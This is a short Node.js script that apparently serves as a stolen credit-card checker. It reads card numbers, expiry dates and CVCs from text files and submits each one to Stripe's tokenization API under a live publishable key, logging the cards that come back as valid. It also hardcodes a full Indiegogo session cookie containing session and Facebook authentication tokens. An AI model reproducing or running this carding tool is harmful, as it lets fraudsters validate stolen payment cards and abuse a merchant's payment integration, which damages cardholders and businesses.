var fetch = require('node-fetch');
var stripe = require('stripe')('pk_live_4MPR2HZ7wsaVW1UjCkztWYwq');
var chalk = require('chalk')
var fs = require('fs')

var cookie = 'romref=dir-XXXX; romref_referer_host=; cohort=%7Cdir-XXXX; visitor_id=d8206335aebba4744e94f18bc2c57884a7d833719fdf9f43270ae14dff6a86b3; analytics_session_id=8f92f8b8a99ac3119aa8b32f82a6e178754cf01512cab445e0b0060c83b73eae; recent_project_ids=2372754; _ga=GA1.2.838157512.1535426483; _gid=GA1.2.175768171.1535426483; CookieConsent=-1; __hstc=223492548.4226689987b1aaf674e7564e47567de3.1535426492750.1535426492750.1535426492750.1; __hssrc=1; hubspotutk=4226689987b1aaf674e7564e47567de3; previous_account_ids=19307562; fb_update=2018-08-27+20%3A26%3A01+-0700; sailthru_hid=a7025c27f946abb57041b5a8ec0b97465b84c0c89c625f5cf5260d8ab9d01339155d5e7708bafa019b825930; fbm_2392863781=base_domain=.indiegogo.com; __stripe_mid=6ea12227-2dfc-493a-a41a-8ea5d589b845; __stripe_sid=fff20c54-510e-4d9c-a3dc-2d5302dc4914; has_account_debug=DELETED+with+DELETE+https%3A%2F%2Fwww.indiegogo.com%2Faccounts%2Fsign_out.json+at+1535427283; _session_id=495f96400aee743a90552e893cf8e5a8; _gat=1; _gat_campaign=1; fbsr_2392863781=gd1zVM8IngFMfifMv1ts5R9q70DIqzU_fcBR4q_DaFY.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUURmcUdmbV8xSFdDYVdRUHFFT3JQS0g4bGhRS1hLVVJjdFJKSEJnSDV1dFV6NS1pemJLMjBaaEFzZ0gxR3V4MkVJWTZDdzVtWU1iQWYyRVhnZG9URjJLaXBFS2dCZjhQVk9vSzBpQms0NXVHZkZuRF9vVHc5cUcxMV9WQ01xN05VMHQtSFpYajgwdUJiMFVrY29nUHdFRFFXbjJYczZEYlh6c2JYS3BybFVhbERiWUJ2VlhFUjAxVXpjSU5SVGNoWTQ0VlItQzBteUFxNU8xMUtzOHA3UzNQQkZ4RElSY3BvOXJzV3NBVzVzbC1iblhYaHVOdEpjTF9zcXpBdV9RMXJoLWJnc05CRDNqVlBqUi1JNTVTckRUNUlrOW5wQlVpYkJpTURLSW4wckYtZm9OTDRldEhxd3BHOS1aR1NmaXlRUjktUHl6NUlQRC1kTzZsT2NqUkpDMCIsImlzc3VlZF9hdCI6MTUzNTQyNzI4OCwidXNlcl9pZCI6Ijg3MzQzNjU1NjM3ODkwMSJ9; _ceg.s=pe5ja4; _ceg.u=pe5ja4; __hssc=223492548.4.1535426492751'
const cardToken = []

const card = fs.readFileSync('card.txt', "utf-8").split('\n');
const month = fs.readFileSync('exp_month.txt', "utf-8").split('\n');
const year = fs.readFileSync('exp_year.txt', "utf-8").split('\n');
const cvc = fs.readFileSync('cvc.txt', "utf-8").split('\n');
const all = fs.readFileSync('cc.txt', "utf-8").split('\n');

async function getDataToken(){
    for (let i = 0; i < card.length; i++) {
        stripe.tokens.create({
            card: {
                "number": card[i],
                "exp_month": month[i],
                "exp_year": year[i],
                "cvc": cvc[i]
            }
            }, await function(err, token) {
                if (token) {
                    console.log('card number : '+chalk.green(card[i]+'|'+month[i]+'|'+year[i]+'|'+cvc[i]) + ', message ' + chalk.green('Insyaallah Valid')),
                    cardToken.push(token.id)
                }else(
                    console.log(chalk.red(err.raw.code))
                )
        });
    }
}

return getDataToken()


